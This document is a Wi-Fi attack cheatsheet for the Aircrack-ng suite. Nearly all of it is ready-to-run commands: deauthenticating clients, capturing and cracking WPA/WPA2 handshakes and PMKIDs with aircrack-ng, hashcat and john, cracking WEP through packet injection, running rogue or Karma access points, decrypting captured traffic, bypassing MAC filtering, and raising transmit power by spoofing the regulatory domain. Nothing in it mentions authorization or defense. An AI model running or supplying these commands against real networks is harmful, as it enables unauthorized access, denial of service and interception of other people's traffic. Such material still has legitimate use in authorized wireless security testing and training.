# Aircrack-ng Suite Cheatsheet

## Interface Setup

```bash
# List wireless interfaces
airmon-ng

# Kill interfering processes (NetworkManager, wpa_supplicant)
sudo airmon-ng check kill

# Enable monitor mode
sudo airmon-ng start wlan0
# Interface becomes wlan0mon

# Disable monitor mode
sudo airmon-ng stop wlan0mon

# Restart NetworkManager after testing
sudo systemctl start NetworkManager

# Manual monitor mode
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up

# Set regulatory domain for max TX power
sudo iw reg set BO
sudo iwconfig wlan0mon txpower 30

# Verify injection capability
sudo aireplay-ng --test wlan0mon
```

---

## Scanning (airodump-ng)

```bash
# Scan all channels
sudo airodump-ng wlan0mon

# Scan specific band
sudo airodump-ng --band a wlan0mon         # 5 GHz only
sudo airodump-ng --band bg wlan0mon        # 2.4 GHz only
sudo airodump-ng --band abg wlan0mon       # All bands

# Lock to a specific channel
sudo airodump-ng -c 6 wlan0mon

# Filter by BSSID (target one AP)
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF wlan0mon

# Write capture to file (creates .cap, .csv, .kismet.csv, .kismet.netxml)
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Filter by encryption type
sudo airodump-ng --encrypt wpa2 wlan0mon
sudo airodump-ng --encrypt wep wlan0mon
sudo airodump-ng --encrypt opn wlan0mon

# Show WPS information
sudo airodump-ng --wps wlan0mon

# Output column reference:
#   BSSID   = AP MAC           PWR    = Signal (-30 best, -90 weak)
#   Beacons = Beacon count     #Data  = Data frame count
#   #/s     = Data rate        CH     = Channel
#   MB      = Max speed        ENC    = WPA2/WPA/WEP/OPN
#   CIPHER  = CCMP/TKIP        AUTH   = PSK/MGT
#   ESSID   = Network name     STATION = Client MAC
```

---

## Deauthentication (aireplay-ng)

```bash
# Deauth all clients from an AP (5 packets)
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon

# Deauth a specific client
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# Continuous deauth (use Ctrl+C to stop)
sudo aireplay-ng -0 0 -a AA:BB:CC:DD:EE:FF wlan0mon

# mdk4 mass deauthentication (more aggressive)
sudo mdk4 wlan0mon d -B AA:BB:CC:DD:EE:FF
# -B = target BSSID, -S = target station, -c = channel
```

---

## WPA/WPA2 Handshake Capture and Cracking

```bash
# Step 1: Start capture on target AP
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wpa_capture wlan0mon

# Step 2: Deauth a client (in another terminal)
sudo aireplay-ng -0 3 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# Step 3: Wait for "WPA handshake: AA:BB:CC:DD:EE:FF" in airodump output
# Handshake is in wpa_capture-01.cap

# Step 4: Verify handshake
aircrack-ng wpa_capture-01.cap
# Look for "1 handshake" next to the target BSSID

# Step 5a: Crack with aircrack-ng (CPU)
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b AA:BB:CC:DD:EE:FF wpa_capture-01.cap

# Step 5b: Crack with hashcat (GPU — much faster)
# Convert to hashcat format
hcxpcapngtool -o hash.hc22000 wpa_capture-01.cap
# Or older method:
cap2hccapx wpa_capture-01.cap hash.hccapx

# Crack
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Mask attack (8-digit numeric)
hashcat -m 22000 hash.hc22000 -a 3 '?d?d?d?d?d?d?d?d'

# Step 5c: Crack with john
aircrack-ng -J john_hash wpa_capture-01.cap
john --wordlist=/usr/share/wordlists/rockyou.txt john_hash.hccap
```

---

## PMKID Attack (Clientless)

```bash
# Method 1: hcxdumptool (preferred — no client needed)
sudo hcxdumptool -i wlan0mon -o pmkid_capture.pcapng --active_beacon --enable_status=15

# Target specific AP (create filter file with BSSID, no colons)
echo "AABBCCDDEEFF" > filter.txt
sudo hcxdumptool -i wlan0mon -o pmkid_capture.pcapng --filterlist_ap=filter.txt --filtermode=2

# Wait for "FOUND PMKID" message, then Ctrl+C

# Convert and crack
hcxpcapngtool -o pmkid_hash.hc22000 pmkid_capture.pcapng
hashcat -m 22000 pmkid_hash.hc22000 /usr/share/wordlists/rockyou.txt

# Method 2: hcxtools with airmon
sudo hcxdumptool -i wlan0mon -o dump.pcapng --active_beacon
hcxpcapngtool -o hash.hc22000 dump.pcapng
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
```

---

## WEP Cracking

```bash
# Step 1: Start capture
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wep_capture wlan0mon

# Step 2: Fake authentication (associate with AP)
sudo aireplay-ng -1 0 -a AA:BB:CC:DD:EE:FF -h YOUR_MAC wlan0mon

# Step 3: ARP replay (generate IVs fast)
sudo aireplay-ng -3 -b AA:BB:CC:DD:EE:FF -h YOUR_MAC wlan0mon

# Step 4: Alternative IV generation methods
# Interactive packet replay
sudo aireplay-ng -2 -b AA:BB:CC:DD:EE:FF -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 wlan0mon

# ChopChop attack
sudo aireplay-ng -4 -b AA:BB:CC:DD:EE:FF -h YOUR_MAC wlan0mon

# Fragmentation attack
sudo aireplay-ng -5 -b AA:BB:CC:DD:EE:FF -h YOUR_MAC wlan0mon

# Step 5: Crack (need ~40,000+ IVs for 64-bit, ~80,000+ for 128-bit)
aircrack-ng wep_capture-01.cap
aircrack-ng -b AA:BB:CC:DD:EE:FF wep_capture-01.cap

# PTW attack (faster, needs ARP packets)
aircrack-ng -z wep_capture-01.cap
```

---

## Other aireplay-ng Attacks

```bash
# Attack modes:
#   -0  Deauthentication
#   -1  Fake authentication
#   -2  Interactive packet replay
#   -3  ARP request replay
#   -4  KoreK chopchop
#   -5  Fragmentation
#   -6  Cafe-latte
#   -7  Client-oriented fragmentation
#   -9  Injection test

# Cafe-latte attack (attack client directly without AP)
sudo aireplay-ng -6 -b AA:BB:CC:DD:EE:FF -h YOUR_MAC -D wlan0mon

# Injection test against specific AP
sudo aireplay-ng -9 -a AA:BB:CC:DD:EE:FF wlan0mon
```

---

## Packet Crafting (packetforge-ng)

```bash
# Create ARP request packet (for WEP replay)
packetforge-ng -0 -a AA:BB:CC:DD:EE:FF -h YOUR_MAC -k 255.255.255.255 -l 255.255.255.255 \
  -y fragment.xor -w arp_request.cap

# Replay crafted packet
sudo aireplay-ng -2 -r arp_request.cap wlan0mon
```

---

## Airbase-ng (Rogue AP)

```bash
# Create a soft AP (open)
sudo airbase-ng -e "FreeWiFi" -c 6 wlan0mon

# Create WPA2 AP
sudo airbase-ng -e "CorpWiFi" -c 6 -Z 4 wlan0mon    # -Z 4 = CCMP (AES)

# Karma attack (respond to all probe requests)
sudo airbase-ng -P -C 30 -e "FreeWiFi" -c 6 wlan0mon
# -P = respond to all probes, -C = beacon interval

# After creating the AP, configure networking on at0 interface:
sudo ip addr add 192.168.1.1/24 dev at0
sudo ip link set at0 up
# Start DHCP server on at0
```

---

## Useful Filters and Utilities

```bash
# Merge capture files
mergecap -w merged.cap capture1.cap capture2.cap

# Convert between formats
tshark -r capture.cap -w capture.pcapng
editcap -F pcap capture.pcapng capture.cap

# Remove duplicate frames
editcap -d capture.cap clean.cap

# Filter specific BSSID from large capture
tshark -r capture.cap -Y "wlan.bssid == aa:bb:cc:dd:ee:ff" -w filtered.cap

# Airdecap-ng — decrypt captured traffic (after cracking the key)
# WPA:
airdecap-ng -e "NetworkName" -p "password123" capture.cap
# WEP:
airdecap-ng -w HEXKEY capture.cap
# Output: capture-dec.cap (decrypted traffic)

# Airolib-ng — precompute PMKs for faster cracking
airolib-ng pmk_db --import essid essid_list.txt
airolib-ng pmk_db --import passwd /usr/share/wordlists/rockyou.txt
airolib-ng pmk_db --batch
aircrack-ng -r pmk_db capture.cap

# Besside-ng — automated WPA handshake grabber
sudo besside-ng -b AA:BB:CC:DD:EE:FF wlan0mon
# Captures handshakes automatically and saves to wpa.cap
```

---

## Common Workflows

### Quick WPA2 Crack

```bash
sudo airmon-ng check kill
sudo airmon-ng start wlan0
sudo airodump-ng wlan0mon                    # Find target
sudo airodump-ng -c 6 --bssid TARGET -w cap wlan0mon  # Capture
sudo aireplay-ng -0 3 -a TARGET wlan0mon     # Deauth (other terminal)
# Wait for handshake
hcxpcapngtool -o hash.hc22000 cap-01.cap
hashcat -m 22000 hash.hc22000 rockyou.txt
```

### Quick PMKID Crack

```bash
sudo airmon-ng check kill
sudo airmon-ng start wlan0
sudo hcxdumptool -i wlan0mon -o dump.pcapng --active_beacon --enable_status=15
# Wait for FOUND PMKID
hcxpcapngtool -o hash.hc22000 dump.pcapng
hashcat -m 22000 hash.hc22000 rockyou.txt
```

### Hidden SSID Discovery

```bash
# Scan — hidden networks show <length: N> as ESSID
sudo airodump-ng wlan0mon
# Deauth a connected client — their probe request reveals the SSID
sudo aireplay-ng -0 5 -a TARGET_BSSID wlan0mon
# ESSID appears in airodump output
```

### MAC Filtering Bypass

```bash
# Observe allowed client MACs in airodump STATION list
# Change your MAC
sudo airmon-ng stop wlan0mon
sudo macchanger -m 11:22:33:44:55:66 wlan0
sudo airmon-ng start wlan0
```
